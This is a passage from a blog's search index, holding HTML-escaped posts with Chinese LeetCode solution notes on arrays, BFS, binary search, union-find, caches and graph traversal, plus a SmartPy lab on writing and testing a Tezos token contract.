ans = [&quot;1/2&quot;] for i in range(2,n): # 只需要遍历前一半的分子即可 for j in range((i+1)//2): # 判断两数是否互质 # 等价于最大公约数是否为 1 if gcd(j+1,i+1) == 1: # 将该分数加入答案 ans.append(str(j+1) + &quot;/&quot; + str(i+1)) # 将 1 与该分数的差加入答案 ans.append(str(i-j) + &quot;/&quot; + str(i+1)) return ans2022.02.11 - 1984. 学生分数的最小差值排序 + 滑动窗口class Solution: def minimumDifference(self, nums: List[int], k: int) -&amp;gt; int: ans = float(&#39;inf&#39;) nums.sort() for i in range(len(nums)-k+1): diff = nums[i+k-1] - nums[i] if diff &amp;lt; ans: ans = diff return ans2022.02.12 - 1020. 飞地的数量BFS 或者 DFS 中“过河拆桥”思想的运用。由于需要统计不连接边界的白色格子的数量，那么先以所有边界为 1 的格子为起点，遍历所有连接的值为 1 格子，并将其置为 0。这么一番操作过后，剩下的所有为 1 的格子，就都是满足条件需要计算的格子了。class Solution: def numEnclaves(self, grid: List[List[int]]) -&amp;gt; int: m, n = len(grid) ,len(grid[0]) # 定义 BFS 递归函数 def bfs(grid, i, j): q = deque() q.append((i, j)) while q: x, y = q.popleft() if grid[x][y] == 1: # “过河拆桥” # 将遍历后的格子置为零 grid[x][y] = 0 for new_x, new_y in [(x+1, y), (x-1, y), (x, y+1), (x, y-1)]: if 0 &amp;lt;= new_x &amp;lt; len(grid) and 0 &amp;lt;= new_y &amp;lt; len(grid[0]) and grid[new_x][new_y]: q.append((new_x, new_y)) # 对所有边界的格子调用 BFS 函数 for i in range(m): bfs(grid, i, 0) bfs(grid, i, n-1) for j in range(n): bfs(grid, 0, j) bfs(grid, m-1, j) # 计算剩下的格子中为 1 的数量 ans = 0 for i in range(1, m-1): for j in range(1, n-1): if grid[i][j] == 1: ans += 1 return ans2022.02.14 - 540. 有序数组中的单一元素题目要求 $O(logN)$ 的时间复杂度，直接提示我们使用二分法来解决这个问题。因为题目给定的数组是有序数组，在所有出现两次的元素中寻找一个只出现一次的元素。传统的二分法是根据二分点的数值大小和目标数的大小来决定后续锁定处理的分块。而这道题则有一点不同，是根据二分位置的值的左右两部分的元素数量来决定的。根据二分点的值我们总能按照元素将当前区块分成两份，而目标元素总是在元素数量为奇数的那一个区块中。根据这个性质，我们就可以设计二分法的方案了：class Solution: def singleNonDuplicate(self, nums: List[int]) -&amp;gt; int: l, r = 0, len(nums) - 1 while l &amp;lt; r: mid = (l+r) // 2 if nums[mid] == nums[mid-1]: # 二分值等于其左边的值的情况 if (mid - l + 1) % 2 == 0: # l 和 mid 之前（包含 mid）有偶数个数 # 说明目标数字在 mid 右侧 l = mid + 1 else: r = mid elif nums[mid] == nums[mid+1]: # 二分值等于其右边的值的情况 if (mid - l + 1) % 2 == 1: # l 和 mid 之前（包含 mid）有奇数个数 # 说明目标数字在 mid 右侧 l = mid else: r = mid - 1 else: # 两边都不相等，说明是只出现一遍的数 return nums[mid] return nums[l]2022.02.16 - 1719. 重构一棵树的方案数号称 LeetCode 史上周赛最难题，几千人里只有十几个人做出来，思维难度非常之变态。class UF: def __init__(self, n): self.__count = n self.parent = [i for i in range(n)] self.weight = [1] * n self.roots = set(self.parent) def union(self, node1, node2): if not self.connected(node1, node2): if self.weight[node1] &amp;lt;= self.weight[node2]: node_light, node_heavy = node1, node2 else: node_light, node_heavy = node2, node1 parent_light = self.find(node_light) parent_heavy = self.find(node_heavy) self.parent[parent_light] = parent_heavy self.weight[parent_heavy] += self.weight[parent_light] self.roots.remove(parent_light) self.__count -= 1 def find(self, node): while node != self.parent[node]: self.parent[node] = self.parent[self.parent[node]] node = self.parent[node] return node def connected(self, node1, node2): return self.find(node1) == self.find(node2) def get_group(self): count = 0 root_2_idx = dict() groups = [[] for _ in range(self.__count)] for node in range(len(self.parent)): root = self.find(node) if root not in root_2_idx: root_2_idx[root] = count count += 1 groups[root_2_idx[root]].append(node) return groupsclass Solution: def checkWays(self, pairs: List[List[int]]) -&amp;gt; int: def rec(pairs): cnt = [] num_2_idx, idx_2_num = dict(), dict() for pair in pairs: if pair[0] not in num_2_idx: idx_2_num[len(cnt)] = pair[0] num_2_idx[pair[0]] = len(cnt) cnt.append(1) else: cnt[num_2_idx[pair[0]]] += 1 if pair[1] not in num_2_idx: idx_2_num[len(cnt)] = pair[1] num_2_idx[pair[1]] = len(cnt) cnt.append(1) else: cnt[num_2_idx[pair[1]]] += 1 roots = [idx_2_num[i] for i in range(len(cnt)) if cnt[i] == (len(cnt) - 1)] root_num = len(roots) if root_num &amp;gt;= 1: res = 0 root = roots[0] # 对每一个可能的 root 都做一次选择 # 把包含 root 的 pair 都去除 idx_2_num = dict() num_2_idx = dict() count = 0 new_pairs = [pair for pair in pairs if root not in pair] for pair in new_pairs: if pair[0] not in num_2_idx: num_2_idx[pair[0]] = count idx_2_num[count] = pair[0] count += 1 if pair[1] not in num_2_idx: num_2_idx[pair[1]] = count idx_2_num[count] = pair[1] count += 1 uf = UF(count) for pair in new_pairs: uf.union(num_2_idx[pair[0]], num_2_idx[pair[1]]) # print(&quot;new_pairs: &quot;, new_pairs, count) root_res = 1 # print(&quot;uf.group: &quot;, uf.get_group()) for idx_group in uf.get_group(): group = [idx_2_num[i] for i in idx_group] pairs_group = [] for pair in new_pairs: if pair[0] in group or pair[1] in group: pairs_group.append(pair) sub_res = rec(pairs_group) # print(&quot;pairs_group: &quot;, pairs_group, sub_res) if sub_res == 0: root_res = 0 break else: root_res = min(root_res * sub_res, 2) res = min(root_res * root_num, 2) return res else: return 0 return rec(pairs)2022.02.16 - 1719. 重构一棵树的方案数LeetCode 史上最难周赛题目2022.02.17 - 688. 骑士在棋盘上的概率仔细鉴别什么时候用回溯什么时候用动态规划。这道题用回溯和动态规划都能做，但是显然，回溯会浪费大量的时间。找到一定的判据来判断究竟什么时候用回溯，什么时候用动态规划。2022.02.21 - 838. 推多米诺方法一：广度优先搜索以所有初始时刻被推倒的骨牌为起点，按时间发展顺序模拟骨牌的推倒，搜索出所有被推倒的骨牌。使用数组 times 来记录所有骨牌被推倒的时间，这个时间最大为 len(dominoes)。当遍历到一个骨牌 i 时，根据其下一个被推倒方向的骨牌 ni 的被推倒时间 times[ni] 来决定是否继续搜索： 如果 times[ni] == -1 说明是没有被推倒的竖直骨牌，那么将其记为推倒，更新 times[ni]，并且加入队列继续搜索。 如果 times[ni] == times[i] + 1 说明该骨牌在同一时刻受到另一个方向的推倒，那么根据规则它将保持竖直，ans[ni] = &#39;.&#39;，并且中止搜索。 # 方法一： 模拟class Solution: def pushDominoes(self, dominoes: str) -&amp;gt; str: n = len(dominoes) ans = [&#39;.&#39;] * n times = [-1 for _ in range(n)] directions = {&#39;L&#39;: -1, &#39;R&#39;: 1} q = deque() # 把初始起点加入队列 for i, d in enumerate(dominoes): if d != &#39;.&#39;: ans[i] = d q.append((i, d)) times[i] = 0 # DFS while q: i, d = q.popleft() ni = i + directions[d] if 0 &amp;lt;= ni &amp;lt; n: if times[i] + 1 == times[ni] and ans[ni] != &#39;.&#39;: ans[ni] = &#39;.&#39; elif times[ni] == -1: ans[ni] = d times[ni] = times[i] + 1 q.append((ni, d)) return &#39;&#39;.join(ans)方法二： 双指针双指针搜索，任何连续竖立的多米诺骨牌构成的子串在最后的状态仅取决于该字串两端的多米诺骨牌： 如果两端的骨牌倒向相同方向，则这一串骨牌均倒向该方向； 如果两端的骨牌相向而倒，则这一串骨牌也相向而倒； 如果两端的骨牌方向相反，则这一串骨牌保持竖立。根据这一规则，使用双指针，寻找所有连续的竖立骨牌的区间，对区间两端点加以分类讨论，然后对区间内部竖立的骨牌处理即可。为了方便，可以在骨牌 list 两端分别加上向外倒的两个骨牌，不影响结果，但是方便代码计算过程。# 方法二： 双指针class Solution: def pushDominoes(self, dominoes: str) -&amp;gt; str: # 两端分别加上一张向外倒的骨牌降低程序复杂性 ans = [&#39;L&#39;] + list(dominoes) + [&#39;R&#39;] n = len(ans) i = 0 while i &amp;lt; n - 1: # 寻找左端点的骨牌 i if ans[i] == &#39;.&#39;: i += 1 continue # 寻找右端点的骨牌 j j = i + 1 while ans[j] == &#39;.&#39;: j += 1 continue # 如果中间存在区间，则开始分类讨论 if i &amp;lt; j - 1: if ans[i] == ans[j]: # 两个端点骨牌都倒向一个方向 for k in range(i+1, j): ans[k] = ans[i] elif ans[i] == &#39;R&#39;: # 两个端点骨牌相向而倒 for k in range((j-i-1)//2): ans[i+k+1] = &#39;R&#39; ans[j-k-1] = &#39;L&#39; # 终点变成下一个区间的起点 i = j # 返回答案时去掉初始加上的两端的骨牌 return &#39;&#39;.join(ans[1:-1])2022.02.22 - 1994. 好子集的数目" }, { "title": "区块链 Lab - Smart Contracts", "url": "/posts/Block_chain_TP2/", "categories": "Blogging, Block chain, Smart contracts", "tags": "Block chain, Smart contracts", "date": "2022-01-09 21:53:00 +0800", "snippet": "1 GuidelinesSmartPy is a high level language (implemented in a Python library) that lets you write smart contracts for Tezos in Python. Furthermore, the website of the project, https://smartpy.io contains handy tools to write, test, deploy smart contracts and interact with them. In this lab, we will use SmartPy and its online platform.1.1 Do not lose your data! SmartPy uses cookies to save locally in your browser your data (scripts, wallets, etc.) Make sure not to delete them! (Your browser may automatically delete them when you close it.) You may also want to save your data on your disk: scripts, faucet data (mnemonics in JSON file), account and contract addresses (tz1… and KT1…), etc. 1.2 Links Slides and Lab exercises https://onurb.gitlab.io/mines2022 SmartPy Online editor https://smartpy.io/ide Wallet https://smartpy.io/wallet/ Contract explorer https://smartpy.io/explorer.html Reference manual https://smartpy.io/docs/ and in particular these parts: the Tests and Scenarios section and the example https://smartpy.io/docs/scenarios/framework#test-example Checking conditions https://smartpy.io/docs/general/checking_condition Block explorers: TzKT https://hangzhounet.tzkt.io tzStats https://hangzhou.tzstats.com 1.3 E-mail me your work Python scripts and tz1... and KT1... addresses of Hangzhounet accounts used, answers to questions. My email is bruno@nomadic-labs.com.2 Getting familiar with SmartPy2.1 First steps Open the SmartPy online editor at https://smartpy.io/ide. Close the pop up, you should have an empty program on your left. Copy-paste the Welcome template available at (https://onurb.gitlab.io/mines2022/welcome.py). import smartpy as sp# This is the SmartPy editor.# You can experiment with SmartPy by loading a template.# (in the Commands menu above this editor)## A typical SmartPy program has the following form:# A class of contractsclass MyContract(sp.Contract): def __init__(self, myParameter1, myParameter2): self.init(myParameter1 = myParameter1, myParameter2 = myParameter2) # An entry point, i.e., a message receiver # (contracts react to messages) @sp.entry_point def myEntryPoint(self, params): sp.verify(self.data.myParameter1 &amp;lt;= self.data.myParameter2) self.data.myParameter1 += params# Tests@sp.add_test(name = &quot;Welcome&quot;)def test(): # We define a test scenario, together with some outputs and checks scenario = sp.test_scenario() # We first define a contract and add it to the scenario c1 = MyContract(12, 123) scenario += c1 # And call some of its entry points scenario += c1.myEntryPoint(12) Run the contract (White on blue play symbol). Observe the new elements displayed on the right panel, in particular the SmartPy and Types tabs. An entrypoint is a method that can be called when interacting with the contract. What does myEntryPoint do? In particular, what does line 19 test? line 19: sp.verify(self.data.myParameter1 &amp;lt;= self.data.myParameter2)import smartpy as sp# This is the SmartPy editor.# You can experiment with SmartPy by loading a template.# (in the Commands menu above this editor)## A typical SmartPy program has the following form:# A class of contractsclass MyContract(sp.Contract): def __init__(self, myParameter1, myParameter2): self.init(myParameter1 = myParameter1, myParameter2 = myParameter2) # An entry point, i.e., a message receiver # (contracts react to messages) @sp.entry_point def myEntryPoint(self, params): sp.verify(self.data.myParameter1 &amp;lt;= self.data.myParameter2) self.data.myParameter1 += params @sp.entry_point def reset(self, params): self.data.myParameter1 = 0 self.data.myParameter2 = params# Tests@sp.add_test(name = &quot;Welcome&quot;)def test(): # We define a test scenario, together with some outputs and checks scenario = sp.test_scenario() # We first define a contract and add it to the scenario c1 = MyContract(123, 12) scenario += c1 # And call some of its entry points scenario += c1.reset(123) scenario += c1.myEntryPoint(12)3 MinesCoinYou want to develop a new blockchain, MinesCoin that promises to be revolutionary. In order to finance its development, you launch a fundraiser by pre-saling the tokens of your future blockchain. The MinesCoin fundraiser will be managed by a Tezos smart contract.3.1 Setting up accountsDownload the template from https://onurb.gitlab.io/mines2022/minescoin.py and copy-paste it in the SmartPy online editor.import smartpy as spclass MinesCoin(sp.Contract): def __init__(self, admin): self.init(balances = sp.big_map(), administrator = admin, totalSupply = 0) @sp.entry_point def transfer(self, params): sp.verify((params.origin == sp.sender) | (self.data.balances[params.origin].approvals[sp.sender] &amp;gt;= params.amount)) self.addAddressIfNecessary(params.destination) sp.verify(self.data.balances[params.origin].balance &amp;gt;= params.amount) self.data.balances[params.origin].balance -= params.amount self.data.balances[params.destination].balance += params.amount sp.if (params.origin != sp.sender): self.data.balances[params.origin].approvals[sp.sender] -= params.amount @sp.entry_point def approve(self, params): sp.verify(params.origin == sp.sender) alreadyApproved = self.data.balances[params.origin].approvals.get(params.destination, 0) sp.verify((alreadyApproved == 0) | (params.amount == 0)) self.data.balances[params.origin].approvals[params.destination] = params.amount @sp.entry_point def mint(self, params): sp.verify(sp.sender == self.data.administrator) self.addAddressIfNecessary(params.address) self.data.balances[params.address].balance += params.amount self.data.totalSupply += params.amount def addAddressIfNecessary(self, address): sp.if ~ self.data.balances.contains(address): self.data.balances[address] = sp.record(balance = 0, approvals = {})@sp.add_test(name = &quot;MinesCoin&quot;)def test(): scenario = sp.test_scenario() scenario.h1(&quot;Simple FA12 Contract&quot;) scenario.h2(&quot;Accounts&quot;) # sp.test_account generates ED25519 key-pairs deterministically: admin = sp.test_account(&quot;Administrator&quot;) # Let&#39;s display the accounts: # scenario.show([admin, alice, bob, charlie]) c1 = MinesCoin(admin.address) scenario += c1 scenario.h2(&quot;Minting coins&quot;) scenario.h3(&quot;TODO Admin mints 18 coins for Alice&quot;) # scenario += c1.mint(address = ..., amount = ...).run(sender = ...) scenario.h3(&quot;TODO Admin mints 24 coins for Bob&quot;) scenario.h2(&quot;Transfers&quot;) scenario.h3(&quot;TODO Alice transfers directly 4 tokens to Bob&quot;) scenario.h3(&quot;TODO Charlie tries to transfer from Alice but does not have her approval&quot;) scenario.h3(&quot;TODO Alice approves Charlie&quot;) scenario.h3(&quot;TODO Charlie transfers Alice&#39;s tokens to Bob&quot;) scenario.h3(&quot;TODO Charlie tries to over transfer from Alice&quot;) scenario.h3(&quot;TODO Alice removes the approval for Charlie&quot;) scenario.h3(&quot;TODO Charlie tries to transfer Alice&#39;s tokens to Bob and fails&quot;) scenario.h2(&quot;Burning coins&quot;) scenario.h3(&quot;TODO Admin burns Bob token&quot;) scenario.h3(&quot;TODO Alice tries to burn Bob token&quot;) Run it to verify that the template is fine. An administrator account is already set. Create three accounts for Alice, Bob and Charlie. Uncomment the line about the display of accounts. Run the contract. # ... scenario.h2(&quot;Accounts&quot;) # sp.test_account generates ED25519 key-pairs deterministically: admin = sp.test_account(&quot;Administrator&quot;) alice = sp.test_account(&quot;Alice&quot;) bob = sp.test_account(&quot;Bob&quot;) charlie = sp.test_account(&quot;Charlie&quot;) # Let&#39;s display the accounts: scenario.show([admin, alice, bob, charlie]) c1 = MinesCoin(admin.address) # ...3.2 Minting coinsAlice and Bob are super excited by MinesCoin and they participated in your crowdfunding campaign. As a consequence, you will credit them with some coins.In order to do that you need to use the mint entry point. mint has two parameters address and amount, which represents respectively the address that is credited and the amount of coins created. Read the code for the mint entry point. Which account has the right to mint coins? What happens if the address given as argument does not exist? Uncomment the line calling mint and then fill the dots so that 18 coins are minted for Alice. Which account should be the sender of the call to mint? (Tip: check the documentation on Test accounts https://smartpy.io/docs/scenarios/testing#test-accounts, address and sender are addresses.) Write the call to mint that creates 24 coins for Bob. Verify that the total supply is 42. (Tip: use scenario.verify(..).) # ... scenario.h2(&quot;Minting coins&quot;) scenario.h3(&quot;TODO Admin mints 18 coins for Alice&quot;) scenario += c1.mint(address = alice.address, amount = 18).run(sender = admin.address) scenario.h3(&quot;TODO Admin mints 24 coins for Bob&quot;) scenario += c1.mint(address = bob.address, amount = 24).run(sender = admin.address) scenario.verify(c1.data.totalSupply == 42) # ...3.3 Transfers and approvalsYou want to allow transfers of MinesCoin between contributors while the technology is not ready yet. Read the code of transfer. What are its three arguments?params.origin, params.amount and params.destination.Direct and indirect transfers are possible. Direct transfers are simple: Alice calls transfer to send some of her tokens to Bob. Indirect transfers are a bit more subtle: Charlie calls transfer to send X of Alice’s coins to Bob. This indirect transfer will succeed if Alice has approved that Charlie can spend X or more tokens on her behalf. Indirect transfers are useful if Charlie is a third party (exchange, wallet, etc.) that can connect Alice and Bob. Write the call to transfer that corresponds to Alice sending directly 4 tokens to Bob. Write the call to transfer that corresponds to Charlie sending 8 tokens from Alice to Bob. Does it fail? Why? Fix this by giving Alice’s approval to Charlie for spending 10 of her tokens. You should use a call to approve. Write another call where Charlie tries to over-transfer from Alice. Remove the approval of Alice to Charlie by calling approve with an amount of 0. Verify that Charlie cannot indeed transfer from Alice.3.4 Burning coinsAlas, developing a blockchain technology turns out much harder than what you expected. MinesCoin is still not ready and some contributors want some of their money back. The rules of the fundraiser allow that: contributions are given back and tokens are destroyed or burned. Write a burn entry point that subtracts tokens to the balances of accounts. Like mint, burn has two parameters address and amount. Note that burn must be called by the administrator that the amount of burnt tokens must be smaller or equal to the balance of the account that the totalSupply needs to be updated as well. Write a test where Admin burns 2 tokens from Bob. Verify that the balance of Bob has decreased. Write a test that verifies that Alice cannot burn Bob tokens. Write a test that verifies that no token is burnt if the amount is more than the number of tokens possessed by Bob.3.5 Deploying it on Hangzhounet Use the faucet to create accounts for the Administrator, Alice, Bob and Charlie. Deploy the contract with the Administrator signing the operation. Note that the initial storage is defined by the test scenario and cannot be changed. Add in the test scenario a new instance of the contract with the Administrator from the Faucet. (Use sp.address(&#39;tz1...&#39;)). Save the originated contract in your wallet. (Tip: you may need to reload the estimate cost from RPC if your gas limit is too low.) Interact with the contract using the Explorer (https://smartpy.io/explorer.html). You can replay the tests previously used and observe the modification of the storage. (Tip: have two windows opened, one with the explorer, another with the wallet so you can quickly find your wallet addresses.)Check the status of the contract in using https://hangzhou.tzstats.com/, because the Explorer can not correctly show the data balances." }, { "title": "LeetCode 刷题记录 - 数据结构设计", "url": "/posts/LeetCode_data_structure_design/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Data structure design", "date": "2022-01-08 21:28:00 +0800", "snippet": " 146. LRU Cache这道题的主要目标是构造一个数据结构来实现 LRU 缓存机制。当内存的空间满了之后，我们总是需要按照一定的原则来删除内存中的数据，为新数据腾出空间。LRU 就是这样一种机制，LRU 的全称是 Least Recently Used，也就是根据内容的最后一次使用时间来选择数据删除的优先级。相比起最近使用过的数据，我们会优先选择删除好久没用过的数据。所以这道题的数据结构设计思路就是：双链表加上字典的组合。 使用链表是为了实现优先级的结构，即将最近访问的数据提到链表最前端，自然未使用的数据就会向链表末端下沉的。同时链表也能实现时间复杂度为$O(1)$的插入。双头的原因是为了方便删除节点。节点内需要同时存储上数据的key和value。存储key的原因在于删除节点时需要同时删除字典内的key，如果在节点中不存储key的话，在删除节点时是做不到删除字典中对应数据的。 字典是为了实现时间复杂度为$O(1)$的访问。注意字典中key对应存储的不是数据的value，而是对应的节点，这样才能在访问的同时实现将对应的节点推到链表的最前端。 参考代码如下：class Node: def __init__(self, key=None, val=0, next_node=None, pre_node=None): # 双链表结构，存储数据的键值对 self.key = key self.val = val self.next = next_node self.pre = pre_nodeclass LRUCache: def __init__(self, capacity: int): # 初始化字典 self.dict = dict() # 初始化头节点和尾节点 self.head = Node(val=&#39;head&#39;) self.tail = Node(val=&#39;tail&#39;, pre_node=self.head) self.head.next = self.tail # 初始化容量和数据数量 self.count = 0 self.capacity = capacity def get(self, key: int) -&amp;gt; int: if not key in self.dict: # 如果不存在 key，返回 -1 return -1 else: # 如果存在，使用字典返回 value，时间复杂度O(1) curr_node = self.dict[key] # 将该节点推到双链表最前端 self.put_first(curr_node) return curr_node.val def put(self, key: int, value: int) -&amp;gt; None: if key not in self.dict: # 如果 key 不存在则在最前端创建新的节点 # 首先判断存储量是否到上限 if self.count == self.capacity: # 如果存储量到上限，则删除最后一个节点 delete_node = self.tail.pre delete_key = delete_node.key self.tail.pre = delete_node.pre self.tail.pre.next = self.tail self.dict.pop(delete_key) del(delete_node) else: # 未到达上限，则 count +1 self.count += 1 # 创建新节点 new_node = Node(key=key, val=value, next_node=self.head.next, pre_node=self.head) self.dict[key] = new_node self.head.next.pre = new_node self.head.next = new_node else: # 如果 key 早已存在，更改对应的 value 并且将该节点插入到链表最前端 curr_node = self.dict[key] curr_node.val = value self.put_first(curr_node) def put_first(self, node): # 将节点插入链表最前端 node.pre.next = node.next node.next.pre = node.pre node.next = self.head.next self.head.next.pre = node self.head.next = node node.pre = self.head参考链接：算法就像搭乐高：带你手撸 LRU 算法460. LFU Cache这一题和上一题相似，也是实现一个缓存机制，但是这次是 LFU 机制：Last Frequently Used，也就是按照使用频率顺序删除数据。当内存达到上限的时候，我们优先删除访问次数最少的数据，如果碰到多个数据具有相同的使用频率，则删除最旧的数据。首先按照题目要求（和上一题一样），我们需要实现以下功能： 时间为$O(1)$的插入或更改数据并更新使用频率； 时间为$O(1)$的访问数据； 当内存已满，插入新数据时，以$O(1)$的时间复杂度删除使用频率最低数据删除； 当删除数据时遇到多个数据，要能以$O(1)$时间找出最旧的数据删除；上一题 LRU 机制可以满足第 1 条和第 2 条，但是没法满足 3 和 4。显然需要对结构进行改进。数据结构构造如下数据结构来满足我们的需求： 使用一个dict存储key到value的映射，用以访问数据 使用一个dict存储key到freq的映射，用以更新数据的使用频率 使用一个dict存储freq到key的映射，用以按照时序删除key 使用临时变量min_freq来存储目前的最小使用频率这里需要注意，从freq到key的映射需要满足如下三个条件： 需要满足一对多的映射 能够反映key之间的时序关系 能够以$O(1)$的时间插入或删除freq对应的一个keyPython 的collections包中有一个数据结构能够满足上述条件，那就是collections.OrderedDict。我们构建一个dict，使得freq为键，对应的值是一个OrderedDict，其中存储的是所有频率为freq的key。OrderedDict是一个类似于我们上一题构造的既可以满足时序要求同时也可以以常数时间访问的结构。可以理解为链表和哈希表的结合体。它的popitem(last=True)方法可以弹出最新存储的键值对，如果设置参数last=False则是弹出最旧的键值对。为了方便初始化从freq到key映射的默认值，我使用了collections.defaultdict这个结构，主要是当key不存在的时候可以直接初始化一个默认的OrderedDict变量。代码实现剩下的就是代码部分了，首先从put和get两个基本功能开始写，其中能抽象的部分先抽象成高级函数。然后写出高级函数的函数头，其中用注释注明思路和需要实现的步骤。然后一个模块一个模块实现并测试，就可以条理清晰地写出难出 bug 的代码了。class LFUCache: def __init__(self, capacity: int): # 需要构造三个表来实现功能 self.key_to_val = dict() self.key_to_freq = dict() self.freq_to_key = collections.defaultdict(collections.OrderedDict) self.min_freq = 0 self.count = 0 self.capacity = capacity def get(self, key: int) -&amp;gt; int: if self.capacity == 0: return -1 if key in self.key_to_val: # 如果 key 存在 # key 的访问频率加一 self.increase_freq(key) # 返回对应 val return self.key_to_val[key] else: # 不存在返回 -1 return -1 def put(self, key: int, value: int) -&amp;gt; None: if self.capacity == 0: return if key in self.key_to_val: # 如果 key 存在 # 更改 key 的 val self.key_to_val[key] = value # key 的访问频率加一 self.increase_freq(key) else: # 如果 key 不存在 # 判断容量是否到达上限 if self.count == self.capacity: # 删除最低频率使用过的 key self.delete_min_freq_key() else: self.count += 1 # 增加新 key self.add_new_key(key, value) def increase_freq(self, key): # 增加 key 的访问频率 curr_freq = self.key_to_freq[key] # KF 字典中，需要改变 key 对应的 freq self.key_to_freq[key] += 1 # FK 字典中，需要将 key 从 freq 的 OrderedDict 中删除 self.freq_to_key[curr_freq].pop(key) # 将 key 添加到 freq+1 的 OrderedDict 中 self.freq_to_key[curr_freq+1][key] = key # 判断 freq 是不是 min_freq if curr_freq == self.min_freq: # 如果是，则判断原 OrderedDict 中是否还有元素 if not self.freq_to_key[curr_freq]: # 如果原 dict 为空，min_freq += 1 self.min_freq += 1 def delete_min_freq_key(self): # 删除使用频率最低的 key # 根据 min_freq 找到最小的 freq 对应的 key list # 使用 OrderedDict 的 pop() 方法删除最近的 key 并得到值 delete_key = self.freq_to_key[self.min_freq].popitem(last=False)[0] # 删除另外两个 dict 中的 key self.key_to_freq.pop(delete_key) self.key_to_val.pop(delete_key) # 由于调用该函数之后会紧接着新创建一个数据 # 该数据的 freq 必为 1，所以不用更新 min_freq def add_new_key(self, key, value): # 添加一个新的值为 value， freq 为 1 的 key # KV 字典中，新增 key-val 键值对 self.key_to_val[key] = value # KF 字典中，新增 key-1 键值对 self.key_to_freq[key] = 1 # VF 字典中，在 freq 为 1 的 OrderedDict 中增加 key self.freq_to_key[1][key] = key # 将 min_freq 记为 1 self.min_freq = 1参考链接算法就像搭乐高：带你手撸 LFU 算法" }, { "title": "LeetCode 刷题记录 - 数据结构之图（Graph）", "url": "/posts/LeetCode_graph/", "categories": "Blogging, LeetCode", "tags": "LeetCode, Graph", "date": "2021-12-31 14:57:00 +0800", "snippet": " 图论基础主要组成：节点和边主要存储方式： 邻接表：占用空间少，但无法快速判断两节点是否相邻； 邻接矩阵：占用空间大，但是可以快速判断两节点是否相邻。重要概念： 有向图与无向图：无向就等于双向； 有环图与无环图：有环图需要visited数组来辅助遍历； 加权图：存储的邻接矩阵内的元素从布尔值变为整数或浮点数即可。参考链接：图论基础797. All Paths From Source to Target这道题输入一幅有向无环图，这个图包含n个节点，标号从0到n-1，要求计算出所有从节点0到节点n-1的路径。题目输入的graph是用「邻接表」表示的一幅图，其中graph[i]存储着节点i的所有邻居节点。思路比较简单：以0为起点遍历图，同时记录遍历过的路径，当遍历到终点时将路径记录下来即可。因为输入的图是无环且需要重复访问节点，所以不需要visited数组辅助，每条路径都是一定有终点的。参考代码如下：class Solution: def allPathsSourceTarget(self, graph: List[List[int]]) -&amp;gt; List[List[int]]: # 获得节点总数 n = len(graph) path = [] res = [] def traverse(i): # 把当前节点加入列表 path.append(i) # 如果是终点，则把路径加入结果列表 if i == n-1: res.append(path.copy()) else: # 遍历所有邻居节点 for neighbor in graph[i]: traverse(neighbor) # 离开时将当前节点从路径中删除 path.pop() traverse(0) return res207. Course Schedule经典的判断有向图是否有环的问题。问题设定在一个选课的背景下。给出numCourses为课程的数量，以及prerequisites: List[List[int]]存储了课程与课程之间的先决条件，给出这些课程是否可以学完，也就是确定由课程构成的图中是否有环。思路比较简单，首先生成对应的邻接表，之后写好递归遍历的函数，结合visited减少重复遍历，最后靠onPath数组表示路径来判断是否有环。class Solution: def canFinish(self, numCourses: int, prerequisites: List[List[int]]) -&amp;gt; bool: # 用邻接表生成graph graph = [[] for _ in range(numCourses)] for prereq in prerequisites: graph[prereq[1]].append(prereq[0]) # 初始化辅助用数组 visited = [False for _ in range(numCourses)] onPath = [False for _ in range(numCourses)] hasCycle = False # 定义遍历函数 def traverse(node): nonlocal hasCycle # 如果节点在路径上，则有环 if onPath[node]: hasCycle = True return # 如果访问过或者有环，停止遍历 if visited[node] or hasCycle: return # 前序遍历操作 visited[node] = True onPath[node] = True for neighbor in graph[node]: traverse(neighbor) # 后序遍历操作 onPath[node] = False for node in range(numCourses): traverse(node) return not hasCycle210. Course Schedule II经典图论的拓扑排序问题，问题依旧是选课问题。给出numCourses为课程的数量，以及prerequisites: List[List[int]]存储了课程与课程之间的先决条件，给出为了学完所有课程所安排的学习顺序。而直观地说，拓扑排序（Topological Sorting）的定义就是：把一幅图「拉平」，而且这个「拉平」的图里面，所有箭头方向都是一致的。相当于一个以节点优先级作为标准的排序问题。对于这个问题，如果把课程抽象成节点，课程之间的依赖关系抽象成有向边，那么这幅图的拓扑排序结果就是上课顺序。首先实现上一题的代码判断是否有环，而拓扑排序的结果，其实就是后序遍历结果的反转。为什么？有一个非常直观的解释：在后序遍历中，只有遍历完所有邻居节点（在这道题里是前置课程）之后才会执行后序遍历位置的代码。换句话说，当邻居节点都被装到结果列表里面了，当前节点才会被装进去。后序遍历的这一特点很重要，之所以拓扑排序的基础是后序遍历，是因为一个任务必须在等到所有的依赖任务都完成之后才能开始开始执行。至于为什么是后续遍历结果的反转，这取决与实际问题对应的图中边的方向的意义，如果是低优先级指向高优先级（一门课程的先修课程指向该课程，也就是学习顺序），那么就需要反转。如果是高优先级指向低优先级（一门课程指向其先修课程），那么实际上就并不需要反转，主要还是要结合实际情况分析。参考代码如下：class Solution: def findOrder(self, numCourses: int, prerequisites: List[List[int]]) -&amp;gt; List[int]: # 遍历函数 def traverse(node): # 如果节点在路径里，判断有环 nonlocal hasCycle if path[node]: hasCycle = True # 如果存在环或者访问过就跳过 if visited[node] or hasCycle: return # 前序遍历操作 path[node] = True visited[node] = True # 遍历 for neighbor in graph[node]: traverse(neighbor) # 后序遍历操作 path[node] = False res.append(node) # 生成图的邻接表 graph = [[] for _ in range(numCourses)] for prec in prerequisites: graph[prec[1]].append(prec[0]) # 初始化变量 path = [False for _ in range(numCourses)] visited = [0 for _ in range(numCourses)] hasCycle = False res = [] for node in range(numCourses): traverse(node) if hasCycle: return [] # 翻转后序遍历结果 res.reverse() return res还有一个很厉害的思路，不用到递归方法，也快很多，就是直接从课程的前置条件信息中，将课程的优先级计算出来，然后逐渐遍历零优先级的课程（也就是不需要前置条件的课程），去降低对应后续课程的优先级，逐渐扩充结果列表。具体代码如下：class Solution(object): def findOrder(self, numCourses, prerequisites): &quot;&quot;&quot; :type numCourses: int :type prerequisites: List[List[int]] :rtype: List[int] &quot;&quot;&quot; # 生成邻接表和优先级表 adjacency_list = [[] for i in range(numCourses)] in_degrees = [0] * numCourses for courses in prerequisites: course, prereq = courses # 前置课程指向后续课程 adjacency_list[prereq].append(course) # 后续课程的优先级更高 in_degrees[course] += 1 # 过滤出所有不需要前置条件的课程，也就是零优先级课程 zero_indegree_courses = [i for i in 